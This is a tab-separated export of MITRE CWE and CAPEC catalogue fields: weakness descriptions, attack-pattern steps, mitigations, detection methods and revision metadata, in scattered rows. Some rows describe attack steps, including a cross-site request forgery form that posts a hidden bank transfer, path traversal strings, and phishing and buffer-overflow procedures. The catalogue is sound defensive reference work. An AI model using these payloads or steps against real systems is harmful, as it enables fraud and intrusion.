14310	46	When a comment does not accurately reflect the associated code elements, this can introduce confusion to a reviewer (due to inconsistencies) or make it more difficult and less efficient to validate that the code is implementing the intended behavior correctly. This issue makes it more difficult to maintain the software, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.
17748	28	CWE Content Team
7859	61	Draft
13568	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Formal Methods / Correct-By-Construction                            Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)
8222	36	http://www.mindpride.net/root/Extras/how-stuff-works/how_computer_viruses_work.htm
22467	28	CWE Content Team
10941	63	Varies by Context
15623	23	The software receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special characters such as "<", ">", and "&" that could be interpreted as web-scripting elements when they are sent to a downstream component that processes web pages.
10485	35	Cigital
6539	35	Cigital
6047	91	Operation
8335	62	updated Relationships
11990	39	2011-06-01
7919	81	Integrity
11203	91	Requirements
24468	47	Unreliable Execution
21299	33	Taimur Aslam
11567	62	updated Common_Consequences
13770	90	Language-Independent
24839	56	ChildOf
12069	28	CWE Content Team
20394	43	Simple
15364	39	2014-07-30
22597	91	Operation
12230	31	1000
14499	101	CAPEC Content Team
6709	59	Updated Related_Attack_Patterns
8270	35	MITRE
12022	95	[Launch an XML routing detour attack] The attacker injects a bogus routing node (using a WS-Referral service) into the routing table of the XML header of the SOAP message identified in the Explore phase. Thus, the attacker can route the XML message to the attacker controlled node (and access the message contents).
9325	76	2019-09-30
6825	73	Spider web sites for all available links.
18644	81	Non-Repudiation
19121	79	Integrity
11099	42	Declare Java beans "local" when possible. When a bean must be remotely accessible, make sure that sensitive information is not exposed, and ensure that the application logic performs appropriate validation of any data that might be modified by an attacker.
25347	84	28
23418	39	2009-07-27
23829	31	699
12798	39	2012-05-11
10400	79	Confidentiality
13323	27	Tools that automate encoding of data can assist the adversary in generating encoded strings.
6433	35	MITRE
11781	46	When the software has a data access component, the design may be intended to handle all data access operations through that component.  If a data access operation is performed outside of that component, then this may indicate a violation of the intended design.   This issue can prevent the software from running reliably.  If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.
16227	88	Path Traversal: '\absolute\pathname\here'
10005	62	updated Relationships, Other_Notes, Taxonomy_Mappings
8028	39	2008-09-08
8301	80	The ability to make an API request, and knowledge of "ghost" characters that will not be filtered by any input validation. These "ghost" characters must be known to not affect the way in which the request will be interpreted.
11709	39	2008-09-08
20379	69	Draft
24270	56	ChildOf
18132	28	CWE Content Team
17531	72	If one executes code at a known location, an attacker might be able to inject code there beforehand.
8442	39	2017-11-08
13103	35	MITRE
9240	39	2008-11-24
8775	35	MITRE
12718	97	Bypassing of Intermediate Forms in Multiple-Form Sets
23621	35	MITRE
10416	103	Primary
5591	39	2008-07-01
19679	28	CWE Content Team
22077	23	The software uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize "..\" sequences that can resolve to a location that is outside of that directory.
15007	66	Top 25 Series - Rank 20 - Download of Code Without Integrity Check
14086	62	updated Potential_Mitigations, Time_of_Introduction
22337	39	2008-07-01
9787	28	CWE Content Team
8296	76	2017-08-04
8827	81	Integrity
17453	28	CWE Content Team
25055	31	699
18085	63	DoS: Crash, Exit, or Restart
19751	35	Cigital
7807	31	1000
6476	73	Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and performs actions on the same web site
11319	28	CWE Content Team
6001	23	An attacker manipulates the headers and content of an email message by injecting data via the use of delimiter characters native to the protocol. Many applications allow users to send email messages by filling in fields. For example, a web site may have a link to "share this site with a friend" where the user provides the recipient's email address and the web application fills out all the other fields, such as the subject and body. In this pattern, an attacker adds header and body information to an email message by injecting additional content in an input field used to construct a header of the mail message. This attack takes advantage of the fact that RFC 822 requires that headers in a mail message be separated by a carriage return. As a result, an attacker can inject new headers or content simply by adding a delimiting carriage return and then supplying the new heading and body information. This attack will not work if the user can only supply the message body since a carriage return in the body is treated as a normal character.
14993	91	Installation
23953	62	updated Common_Consequences
13153	35	MITRE
6616	39	2012-10-30
6765	31	699
22623	69	Incomplete
13418	59	Updated Related_Attack_Patterns
14580	55	CAPEC Content Team
12580	40	Multiple parser passes are performed on the data supplied by the user.
24990	28	CWE Content Team
10026	40	Software must allow for unvalidated or unfiltered input to be executed on operating system shell, and, optionally, the system configuration must allow for output to be sent back to client.
25146	56	ChildOf
22014	78	High
24293	62	updated Demonstrative_Examples, Likelihood_of_Exploit, Modes_of_Introduction, References, Relationships, Taxonomy_Mappings
18166	39	2008-08-01
24447	90	PHP
12983	56	ChildOf
19126	48	09
18802	31	1000
16291	39	2011-03-29
23076	70	Threat Protection in a Service Oriented World
17973	40	The victim must have a system running exploitable applications and/or a vulnerable configuration to allow for initial infiltration.
16128	39	2008-07-01
15346	102	ChildOf
13728	62	updated Relationships
10715	85	242
7115	92	Experiment
11222	35	MITRE
24084	21	Anonymous Tool Vendor (under NDA)
8916	31	1000
24882	61	Stable
8461	79	Authorization
12554	35	MITRE
8504	35	MITRE
8887	39	2011-06-27
21527	28	CWE Content Team
25324	76	2017-01-09
25096	48	03
19801	28	CWE Content Team
23563	28	CWE Content Team
22716	62	updated Related_Attack_Patterns
20062	62	updated Relationships
13365	39	2012-05-11
20939	23	An adversary takes advantage of weaknesses in the protocol by which a client and server are communicating to perform unexpected actions. Communication protocols are necessary to transfer messages between client and server applications. Moreover, different protocols may be used for different types of interactions. For example, an authentication protocol might be used to establish the identities of the server and client while a separate messaging protocol might be used to exchange data. If there is a weakness in a protocol used by the client and server, an attacker might take advantage of this to perform various types of attacks. For example, if the attacker is able to manipulate an authentication protocol, the attacker may be able spoof other clients or servers. If the attacker is able to manipulate a messaging protocol, the may be able to read sensitive information or modify message contents. This attack is often made easier by the fact that many clients and servers support multiple protocols to perform similar roles. For example, a server might support several different authentication protocols in order to support a wide range of clients, including legacy clients. Some of the older protocols may have vulnerabilities that allow an attacker to manipulate client-server interactions.
9933	39	2011-06-27
10857	43	Simple
10274	32	The Wikimedia Foundation, Inc
10795	88	Buffer Over-read
15298	23	An adversary engages in pretexting behavior to solicit information from target persons, or manipulate the target into performing some action that serves the adversary's interests. During a pretexting attack, the adversary creates an invented scenario, assuming an identity or role to persuade a targeted victim to release information or perform some action. It is more than just creating a lie; in some cases it can be creating a whole new identity and then using that identity to manipulate the receipt of information. Pretexting can also be used to impersonate people in certain jobs and roles that they never themselves have done. In simple form, these attacks can be leveraged to learn information about a target. More complicated iterations may seek to solicit a target to perform some action that assists the adversary in exploiting organizational weaknesses or obtaining access to secure facilities or systems. Pretexting is not a one-size fits all solution. Good information gathering techniques can make or break a good pretext. A solid pretext is an essential part of building trust. If an adversary’s alias, story, or identity has holes or lacks credibility or even the perception of credibility the target will most likely catch on.
7561	53	The MITRE Corporation
24256	89	Detailed
13025	26	Operation
10623	62	updated Common_Consequences
14981	39	2011-06-01
8595	39	2017-11-08
16707	28	CWE Content Team
17260	50	All user-controllable input should be validated and filtered for potentially unwanted characters. Whitelisting input is desired, but if a blacklisting approach is necessary, then focusing on command related terms and delimiters is necessary.
6470	63	Gain Privileges or Assume Identity
20492	74	2
6079	91	Implementation
15440	62	updated Demonstrative_Examples
21963	81	Integrity
8723	28	CWE Content Team
12693	51	2015-11-09
22575	103	Primary
13585	39	2008-10-14
15923	62	updated Relationships, Taxonomy_Mappings, Weakness_Ordinalities
10395	101	CAPEC Content Team
22325	62	updated Relationships, Taxonomy_Mappings
14387	69	Draft
9265	42	Assign all variables to an initial value.
25162	28	Sean Eidemiller
14107	43	Simple
20128	76	2015-12-07
10643	35	MITRE
5611	56	ChildOf
25085	62	updated Common_Consequences
23325	39	2019-01-03
13777	62	updated Related_Attack_Patterns
23047	35	MITRE
7917	31	1000
13091	102	ChildOf
11340	62	updated Potential_Mitigations, Time_of_Introduction
15864	62	updated Common_Consequences
20057	39	2008-09-08
24139	91	Architecture and Design
14215	62	updated Relationships, Other_Notes, Taxonomy_Mappings
11078	35	MITRE
24384	28	CWE Content Team
8066	95	The attacker manipulates the environment variable to contain excessive-length content to cause a buffer overflow.
25304	103	Primary
11594	85	463
14320	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
13883	40	Access to the open source code base being used by the manufacturer in a system being developed or currently deployed at a victim location.
14215	35	MITRE
18718	39	2008-09-08
18924	42	Ensure that all failures in resource allocation place the system into a safe posture.
12926	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies
14034	91	Implementation
22137	35	MITRE
13924	52	Automated code analysis techniques might not be able to reliably detect this weakness, since the application's behavior and general security model dictate which resource locks are critical. Interpretation of the weakness might require knowledge of the environment, e.g. if the existence of a file is used as a lock, but the file is created in a world-writable directory.
11456	28	CWE Content Team
10384	78	High
17068	31	1000
11170	39	2011-06-01
10681	62	updated Demonstrative_Examples, Potential_Mitigations
13489	31	699
19359	39	2009-10-29
12259	78	Low
25326	39	2008-10-14
19835	28	CWE Content Team
12899	39	2011-06-01
9913	39	2010-06-21
15623	45	Variant
18028	81	Access Control
18104	59	Updated Related_Attack_Patterns
23995	39	2008-07-01
18242	56	ChildOf
13883	78	High
12434	69	Draft
8205	28	CWE Content Team
24980	73	Use a spidering tool to follow and record all non-static links that are likely to have input parameters (through forms, URL, fragments, etc.) actively used by the Web application.
9070	39	2018-03-27
17063	35	MITRE
10997	56	ChildOf
22149	56	ChildOf
16976	28	CWE Content Team
22070	39	2019-06-20
14522	28	CWE Content Team
8677	39	2008-10-14
7475	40	The expanded parameter is used in the context where buffer overflow may become possible due to the incorrect understanding of the parameter size (i.e. thinking that it is smaller than it really is).
21223	39	2012-05-11
16828	35	MITRE
14418	73	Use a web application debugging tool such as Tamper Data, TamperIE, WebScarab,etc. to modify HTTP POST parameters, hidden fields, non-freeform fields, etc.
25153	91	Implementation
12381	28	CWE Content Team
21078	101	CAPEC Content Team
8375	39	2009-10-29
12467	28	CWE Content Team
15586	73	Use kernel tracing utility such as ktrace to monitor application behavior.
25215	25	Medium
7986	77	Automated Static Analysis - Source Code
16789	40	A third party web server which fails to adequately sanitize messages sent in error pages.
23421	35	MITRE
9523	50	Design: Ensure that client process and/or message is authenticated so that anonymous communications and/or messages are not accepted by the system.
8602	28	CWE Content Team
16859	92	Exploit
9341	76	2015-11-09
7355	59	Updated Attacker_Skills_or_Knowledge_Required, Related_Weaknesses
6273	62	updated Relationships, Taxonomy_Mappings
20383	28	CWE Content Team
21735	40	None. Any user can be targeted by a Spear Phishing attack.
14497	92	Explore
13313	97	Blockage
19099	39	2014-07-30
22110	47	Gain Privileges
9752	46	This weakness can cause the downstream component to use a decoding method that produces different data than what the software intended to send. When the wrong encoding is used - even if closely related - the downstream component could decode the data incorrectly. This can have security consequences when the provided boundaries between control and data are inadvertently broken, because the resulting data could introduce control characters or special elements that were not sent by the software. The resulting data could then be used to bypass protection mechanisms such as input validation, and enable injection attacks.             While using output encoding is essential for ensuring that communications between components are accurate, the use of the wrong encoding - even if closely related - could cause the downstream component to misinterpret the output.             For example, HTML entity encoding is used for elements in the HTML body of a web page. However, a programmer might use entity encoding when generating output for that is used within an attribute of an HTML tag, which could contain functional Javascript that is not affected by the HTML encoding.             While web applications have received the most attention for this problem, this weakness could potentially apply to any type of software that uses a communications stream that could support multiple encodings.
22484	66	Avoiding Race Conditions and Insecure File Operations
10121	54	High
12958	45	Base
8439	35	MITRE
9367	31	1000
17323	56	ChildOf
10069	78	Medium
6770	62	updated Applicable_Platforms, Functional_Areas, References
8126	31	699
7390	33	Werner Haas
23138	39	2008-10-14
22466	39	2012-05-11
17733	61	Draft
22292	35	Cigital
6857	39	2009-05-27
13052	91	Architecture and Design
24795	91	Architecture and Design
8255	39	2009-10-29
17858	47	Execute Unauthorized Commands
12099	70	Footprint: What Is And How Do You Erase Them
13222	42	Always test your code on any platform on which it is targeted to run on.
12913	101	CAPEC Content Team
24388	62	updated Relationships
9476	104	323
7901	97	White Box Reverse Engineering
14050	39	2012-05-11
8204	62	updated Common_Consequences
16842	44	Moderate
15556	39	2011-03-29
23473	39	2017-11-08
10834	35	MITRE
11828	77	Manual Static Analysis - Binary or Bytecode
20695	101	CAPEC Content Team
22068	74	3
12946	91	Implementation
8673	95	[Apply mining techniques] The attacker then uses a variety of techniques, such as sniffing, reverse-engineering, and cryptanalysis to extract the information of interest.
15646	35	MITRE
10162	31	1000
18107	28	CWE Content Team
15132	62	updated References, Related_Attack_Patterns, Relationships
15078	35	MITRE
24811	62	updated Other_Notes
18842	95	Write the buffer overflow exploit. To be exploitable, the "spill over" amount (e.g. the difference between the expanded string length and the original string length before it was expanded) needs to be sufficient to allow the overflow of the stack return pointer (in the case of a stack overflow), without causing a stack corruption that would crash the program before it gets to execute the shell code. Heap overflow will be more difficult and will require the attacker to get more lucky, by perhaps getting a chance to overwrite some of the accounting information stored as part of using malloc().
6359	62	updated Observed_Examples
7296	35	KDM Analytics
11816	35	MITRE
15106	26	Implementation
17544	25	Medium
13853	28	CWE Content Team
13760	25	High
15022	55	CAPEC Content Team
22189	100	The MITRE Corporation
11741	39	2012-05-11
10265	44	Moderate
11193	23	The software does not sufficiently hide the internal representation and implementation details of data or methods, which might allow external components or modules to modify data unexpectedly, invoke unexpected functionality, or introduce dependencies that the programmer did not intend.
11601	101	CAPEC Content Team
25254	77	Dynamic Analysis with Manual Results Interpretation
8614	39	2012-10-30
24834	43	Simple
16809	73	Simply wait for an error in memory to occur, redirecting the user to the malicious domain.
9926	59	Updated Attack_Prerequisites, Description, Description Summary, References, Related_Weaknesses, Resources_Required
6524	57	Indirect
20535	95	[Obtain useful contextual detailed information about the targeted user or organization] An adversary collects useful contextual detailed information about the targeted user or organization in order to craft a more deceptive and enticing message to lure the target into responding.
14000	35	MITRE
20721	26	Implementation
16508	28	CWE Content Team
7773	28	CWE Content Team
18937	28	CWE Content Team
20713	76	2019-04-04
10901	26	Architecture and Design
20656	35	MITRE
18137	89	Detailed
14839	35	MITRE
11895	35	MITRE
17698	39	2011-06-01
19950	33	Solar Designer
20104	35	MITRE
12176	76	2019-04-04
7516	85	445
18857	39	2014-07-30
20214	26	Architecture and Design
11021	55	CAPEC Content Team
20365	35	MITRE
22002	35	MITRE
14537	39	2011-06-01
18652	66	SecTheory
9124	60	22
9728	103	Primary
7519	62	updated Relationships, Taxonomy_Mappings
17569	35	MITRE
22587	84	17
6990	56	ChildOf
8660	62	updated Detection_Factors, Taxonomy_Mappings
24243	39	2019-01-03
9944	56	ChildOf
14455	39	2010-04-05
18373	62	updated Applicable_Platforms
10471	28	CWE Content Team
15439	49	2016
12490	31	1000
15920	24	MITRE
15447	78	High
6034	66	Equality comparisons and sameness
16021	78	Very High
15548	39	2011-06-01
13215	39	2011-06-01
20181	81	Non-Repudiation
22809	35	MITRE
24343	26	Implementation
20402	92	Experiment
23583	35	MITRE
23074	42	For web applications, make sure that the access control mechanism is enforced correctly at the server side on every page. Users should not be able to access any unauthorized functionality or information by simply requesting direct access to that page.                   One way to do this is to ensure that all pages containing sensitive information are not cached, and that all such pages restrict access to requests that are accompanied by an active and authenticated session token associated with a user who has the required permissions to access that page.
19384	100	The MITRE Corporation
23324	63	Bypass Protection Mechanism
15923	28	CWE Content Team
24575	35	MITRE
7775	25	Low
19307	35	MITRE
7145	28	CWE Content Team
6631	62	updated Relationships, Taxonomy_Mappings
6018	86	http://msdn.microsoft.com/en-us/library/cc838250.aspx
12987	91	Implementation
19010	28	Eric Dalci
9007	39	2008-07-01
12313	39	2014-07-30
8590	103	Primary
16323	73	Use modified client (modified by reverse engineering) to inject input.
5750	81	Confidentiality
14813	39	2012-10-30
24933	35	MITRE
5708	39	2017-11-08
7513	69	Draft
15534	39	2008-07-01
5775	62	updated Relationships
6236	28	CWE Content Team
23844	35	MITRE
12854	92	Exploit
24724	77	Manual Static Analysis - Source Code
15450	69	Incomplete
19130	62	updated Description
18401	35	KDM Analytics
7452	55	CAPEC Content Team
9881	28	CWE Content Team
12769	43	Simple
12694	76	2018-07-31
9366	101	CAPEC Content Team
13413	35	MITRE
16493	28	CWE Content Team
15306	63	Read Files or Directories
18793	27	The attacker must have the access necessary to affect the files or other environment items the targeted application uses for its operations.
9371	39	2011-03-29
18210	104	689
16446	42	Use techniques such as requiring incrementing, time based and/or challenge response to assure uniqueness of nonces.
6145	42	Use and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component.
12515	28	CWE Content Team
25005	46	If an attacker can guess or steal a session ID, then they may be able to take over the user's session (called session hijacking). The number of possible session IDs increases with increased session ID length, making it more difficult to guess or steal a session ID.
19280	104	694
16732	35	Cigital
19235	56	ChildOf
16322	28	CWE Content Team
12941	54	Low
10158	31	699
6030	45	Variant
12215	81	Integrity
11006	39	2012-10-30
13281	43	Simple
18992	25	Medium
24988	28	CWE Content Team
24300	74	3
8245	62	updated Relationships
21686	103	Primary
20987	39	2010-09-27
16867	91	Operation
24061	39	2019-06-20
12806	39	2008-09-08
12932	70	Researchers: Rootkits headed for BIOS
22853	62	updated Description
8752	39	2011-06-01
20818	28	Eric Dalci
19984	28	CWE Content Team
15032	35	MITRE
10488	57	Indirect
18987	43	Simple
12997	31	1000
8574	26	Implementation
14662	72	An attacker could gain unauthorized access to system resources.
14653	103	Primary
11326	23	A function or method contains too many      operations that utilize a data manager or file resource.
7431	67	High
9457	50	Implementation: Perform input validation for all remote content, including remote and user-generated content
25053	39	2011-06-01
19939	74	1
9709	86	http://www.securityfocus.com/blogs/262
24339	45	Variant
6862	62	updated Time_of_Introduction
8199	79	Confidentiality
14364	26	Operation
20569	61	Draft
23892	39	2019-01-03
18745	28	CWE Content Team
15638	26	Implementation
11518	28	CWE Content Team
18957	28	CWE Content Team
11977	39	2009-10-29
24247	49	2006
16697	23	An adversary exploits weaknesses in input validation by manipulating resource identifiers enabling the unintended modification or specification of a resource.
18785	35	MITRE
17955	49	2001
13726	52	This weakness may be detectable using manual code analysis. Unless authentication is decentralized and applied throughout the software, there can be sufficient time for the analyst to find incoming authentication routines and examine the program logic looking for usage of hard-coded credentials. Configuration files could also be analyzed.
18868	89	Detailed
17887	59	Updated Consequences
23383	102	ChildOf
10607	72	Log files can become so large that they consume excessive resources, such as disk and CPU, which can hinder the performance of the system.
14183	63	Bypass Protection Mechanism
21319	28	CWE Content Team
9063	62	updated Relationships, Taxonomy_Mappings
14255	103	Primary
8563	26	Implementation
16514	35	MITRE
18730	97	Brute Force
11044	90	Language-Independent
14193	31	699
13410	56	ChildOf
20997	23	The programmer accidentally uses the wrong operator, which changes the application logic in security-relevant ways.
15570	62	updated Demonstrative_Examples, Description
8278	80	Adversaries can rent commercial supercomputer time globally to conduct cryptanalysis on encrypted data captured from mobile devices. Foreign governments have their own cryptanalysis technology and capabilities. Commercial cellular standards for encryption (GSM and CDMA) are also subject to adversary cryptanalysis.
20796	45	Variant
17931	62	updated Relationships
8540	21	PLOVER
14677	45	Variant
8353	28	CWE Content Team
11391	45	Base
24834	57	Primary
18235	92	Experiment
9367	56	CanPrecede
9630	24	MITRE
15280	62	updated Description
7116	42	Use and specify an appropriate output encoding to ensure that the special elements are well-defined. A normal byte sequence in one encoding could be a special element in another.
14248	59	Updated Related_Attack_Patterns
20177	40	An environment variable exposed to the user is vulnerable to a buffer overflow.
6369	28	CWE Content Team
15523	28	CWE Content Team
5792	103	Primary
18362	101	CAPEC Content Team
20009	72	The attacker may be able to overwrite, delete, or corrupt unexpected critical files such as programs, libraries, or important data. This may prevent the software from working at all and in the case of a protection mechanisms such as authentication, it has the potential to lockout every user of the software.
16861	39	2009-03-10
13775	39	2017-05-03
16601	28	CWE Content Team
14666	39	2017-11-08
8591	39	2008-07-01
22427	26	Implementation
11060	62	updated Relationships
21580	21	7 Pernicious Kingdoms
20620	39	2014-07-30
11134	104	1055
6587	55	CAPEC Content Team
7840	56	ChildOf
9652	31	699
16544	73	The attacker attempts authenticated access to targeted functions and data.
10959	39	2012-05-11
22309	28	CWE Content Team
24676	63	Bypass Protection Mechanism
7162	54	Medium
24580	39	2014-07-30
20998	35	MITRE
21606	21	PLOVER
12720	46	Attackers might be able to spoof the intended endpoint from a different system or process, thus gaining the same level of access as the intended endpoint.             While this issue frequently involves authentication between network-based clients and servers, other types of communication channels and endpoints can have this weakness.
10912	47	Hide Activities
10315	31	1000
13119	35	MITRE
16732	28	Eric Dalci
9470	23	The product's actions indicate important differences based on (1) the internal state of the product or (2) differences from other products in the same class.
21997	35	MITRE
7864	26	Operation
20370	35	MITRE
18934	49	2010
13463	76	2018-07-31
9555	92	Experiment
23196	35	MITRE
8710	35	MITRE
25180	101	CAPEC Content Team
13550	78	Very High
12299	36	http://conferences2.sigcomm.org/imc/2014/papers/p285.pdf
9902	61	Draft
12507	92	Explore
23644	100	The MITRE Corporation
11115	39	2008-09-08
10955	47	Gain Privileges
12625	62	updated Potential_Mitigations
24954	35	MITRE
15448	91	System Configuration
16379	97	WSDL Scanning
7433	31	699
14704	69	Draft
18823	74	3
24957	43	Simple
24109	39	2008-10-14
15933	62	updated Applicable_Platforms
19159	39	2008-09-08
12225	77	Dynamic Analysis with Manual Results Interpretation
19874	69	Incomplete
24782	62	updated Common_Consequences
10804	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.
22009	90	JavaScript
22786	69	Draft
16263	56	PeerOf
20502	102	ChildOf
18595	53	The MITRE Corporation
22160	28	CWE Content Team
24744	100	The MITRE Corporation
13048	47	Unreliable Execution
7149	63	Read Files or Directories
6744	25	Low
7256	56	ChildOf
10331	70	Anatomy of a Web Services Attack
16134	39	2019-06-20
13227	77	Manual Static Analysis - Binary or Bytecode
22787	26	Implementation
17943	103	Primary
19299	78	High
16156	62	updated Relationships
23168	43	Simple
13349	88	Path Traversal: '....//'
22485	35	MITRE
7720	35	MITRE
24006	26	Implementation
14322	23	The product exposes a resource to the wrong control sphere, providing unintended actors with inappropriate access to the resource.
18066	43	Simple
20899	74	4
24538	89	Detailed
20253	62	updated Relationships
6095	103	Primary
23703	39	2008-08-01
20305	100	The MITRE Corporation
6112	45	Base
14456	59	Updated Related_Attack_Patterns
20118	79	Access Control
9968	28	CWE Content Team
23884	35	MITRE
15855	39	2019-01-03
17973	89	Detailed
19984	62	updated Common_Consequences
18596	91	Implementation
14199	50	Strong physical security of all devices that contain secret key information. (even when devices are not in use)
9182	85	187
15683	35	MITRE
18158	60	19
6646	66	Writing Secure Code
8870	39	2008-07-01
17971	62	updated Potential_Mitigations
13653	40	The server accepts XML input and is using a parser with a runtime longer than O(n) for the insertion of a new attribute in the data container.(examples are .NET framework 1.0 and 1.1)
9249	47	Execute Unauthorized Commands
7901	27	Reverse engineering of software requires varying tools and methods that enable the decompiling of executable or other compiled objects.
18627	53	The MITRE Corporation
12614	31	1000
18356	50	Design: Input validation. Assume that user inputs are malicious. Utilize strict type, character, and encoding enforcement
20567	76	2017-05-01
16443	42	Session identifiers should be at least 128 bits long to prevent brute-force session guessing. A shorter session identifier leaves the application open to brute-force session guessing attacks.
17097	103	Primary
14039	91	Architecture and Design
14263	63	Execute Unauthorized Code or Commands
16138	103	Primary
21052	39	2011-06-01
6377	39	2011-06-27
21259	67	Low
24066	104	576
13994	39	2008-08-01
9625	62	updated Taxonomy_Mappings
6451	28	CWE Content Team
8684	85	617
19064	62	updated Potential_Mitigations
17694	73	Examine the HTTP Response Headers. This may leak information about software signatures
8983	39	2012-05-11
9512	81	Availability
15321	62	updated Demonstrative_Examples
20838	28	CWE Content Team
18173	44	High
17731	47	Other
15336	56	ChildOf
22137	39	2009-07-22
8664	91	Implementation
20553	102	ChildOf
5677	39	2011-06-27
24968	95	[Use stolen credentials to log into legitimate site] Once the adversary captures some sensitive information through phishing (login credentials, credit card information, etc.) the adversary can leverage this information. For instance, the adversary can use the victim's login credentials to log into their bank account and transfer money to an account of their choice.
13928	62	updated Time_of_Introduction
12077	79	Confidentiality
6999	35	MITRE
6559	39	2012-10-30
19253	73	Other Techniques: Use ping sweep, TCP scan, UDP scan, OS Identification various techniques to gain more information about the system and network.
23543	91	Requirements
24091	39	2011-06-01
13159	54	Low
19416	39	2012-05-11
8931	31	699
20550	62	updated Type
16608	33	WASC
19716	89	Detailed
22251	91	Implementation
6314	62	updated Relationships
24539	39	2015-12-07
13336	23	The software initializes critical internal variables or data stores using inputs that can be modified by untrusted actors.
14374	49	2010
25251	56	ChildOf
23037	104	1122
17271	35	MITRE
16514	39	2014-07-30
13096	23	The software validates input before it is canonicalized, which prevents the software from detecting data that becomes invalid after the canonicalization step.
20590	39	2008-09-08
5776	94	The attacker may be able to overwrite or create critical files, such as programs, libraries, or important data. If the targeted file is used for a security mechanism, then the attacker may be able to bypass that mechanism. For example, appending a new account at the end of a password file may allow an attacker to bypass authentication.
13968	39	2012-05-11
5821	95	[Survey the target] Using a browser or an automated tool, an attacker records all instances of web services to process XML requests.
5656	39	2012-05-11
12856	24	MITRE
22316	90	Language-Independent
13583	103	Primary
5928	73	Use automated tools to scan known ports to identify internet-enabled services.
20333	59	Updated Attack_Phases, Attack_Prerequisites, Description Summary, Examples-Instances, Payload_Activation_Impact, Related_Vulnerabilities, Resources_Required
20429	46	An authentication mechanism is only as strong as its credentials. For this reason, it is important to require users to have strong passwords. Lack of password complexity significantly reduces the search space when trying to guess user's passwords, making brute-force attacks easier.
15908	62	updated Relationships, Taxonomy_Mappings
21458	28	CWE Content Team
21991	74	3
14560	79	Integrity
9668	62	updated Relationships, Taxonomy_Mappings
14247	73	Create a form that will submit a POST request (e.g. <form method="POST" action="https://www.somebank.com/members/transfer.asp"><input type="hidden" Name="to" value="012345678901"/><input type="hidden" Name="amt" value="10000"/><input type="submit" src="clickhere.jpg"/></form>
10923	28	CWE Content Team
24769	35	MITRE
18483	35	MITRE
8070	61	Draft
22118	39	2011-03-29
12421	39	2017-11-08
16688	78	Very High
23546	39	2017-11-08
19784	61	Draft
9539	39	2017-11-08
18892	39	2012-05-11
17661	62	Suggested OWASP Top Ten 2004 mapping
24008	62	updated Demonstrative_Examples
24140	88	Improper Handling of Insufficient Permissions or Privileges
20120	102	ChildOf
9892	39	2012-10-30
15510	74	2
22423	28	CWE Content Team
10621	100	The MITRE Corporation
11852	56	ChildOf
14175	61	Draft
18543	104	211
14055	91	Implementation
5754	88	Information Exposure Through Server Error Message
22151	45	Variant
10427	62	updated Description
20613	39	2009-07-27
25123	23	An attacker removes or disables filtering mechanisms on the target application. Input filters prevent invalid data from being sent to an application (for example, overly large inputs that might cause a buffer overflow or other malformed inputs that may not be correctly handled by an application). Input filters might also be designed to constrained executable content. For example, if an application accepts scripting languages as input, an input filter could constrain the commands received and block those that the application's administrator deems to be overly powerful. An output filter screens responses from an application or person in order to prevent disclosure of sensitive information. For example, an application's output filter might block output that is sourced to sensitive folders or which contains certain keywords. A data mask is similar to an output filter, but usually applies to structured data, such as found in databases. Data masks elide or replace portions of the information returned from a query in order to protect against the disclosure of sensitive information. If an input filter is removed the attacker will be able to send content to the target and have the target utilize it without it being sanitized. If the content sent by the attacker is executable, the attacker may be able to execute arbitrary commands on the target. If an output filter or data masking mechanism is disabled, the target may send out sensitive information that would otherwise be elided by the filters. If the data mask is disabled, sensitive information stored in a database would be returned unaltered. This could result in the disclosure of sensitive information, such as social security numbers of payment records. This attack is usually executed as part of a larger attack series. The attacker would disable filters and would then mount additional attacks to either insert commands or data or query the target application in ways that would otherwise be prevented by the filters.
5634	45	Base
9944	31	1000
19067	69	Incomplete
16288	28	CWE Content Team
6383	35	MITRE
18361	39	2008-11-24
5653	28	CWE Content Team
5620	101	CAPEC Content Team
8632	62	updated Potential_Mitigations
18234	62	updated Relationships, Type
20542	28	CWE Content Team
19329	39	2017-11-08
9813	56	ChildOf
7686	35	MITRE
9420	53	The MITRE Corporation
14644	26	Architecture and Design
19228	26	Implementation
24922	35	MITRE
10144	23	An adversary exploits a weakness in the way an application searches for external libraries to manipulate the execution flow to point to an adversary supplied library or code base. This pattern of attack allows the adversary to compromise the application or server via the execution of unauthorized code. An application typically makes calls to functions that are a part of libraries external to the application. These libraries may be part of the operating system or they may be third party libraries. If an adversary can redirect an application's attempts to access these libraries to other libraries that the adversary supplies, the adversary will be able to force the targeted application to execute arbitrary code. This is especially dangerous if the targeted application has enhanced privileges. Access can be redirected through a number of techniques, including the use of symbolic links, search path modification, and relative path manipulation.
16524	35	MITRE
9257	74	3
6202	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies
19376	35	MITRE
10727	28	CWE Content Team
20263	39	2011-06-01
23436	35	Cigital
11165	103	Primary
21706	31	1000
10333	79	Integrity
18912	77	Automated Static Analysis - Binary or Bytecode
25166	76	2015-12-07
10580	101	CAPEC Content Team
17499	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)                            Formal Methods / Correct-By-Construction                                                                     Cost effective for partial coverage:                                                                           Attack Modeling
14270	23	The PHP application receives input from an upstream component, but it does not restrict or incorrectly restricts the input before its usage in "require," "include," or similar functions.
12683	102	ChildOf
8154	47	Read Data
16006	25	High
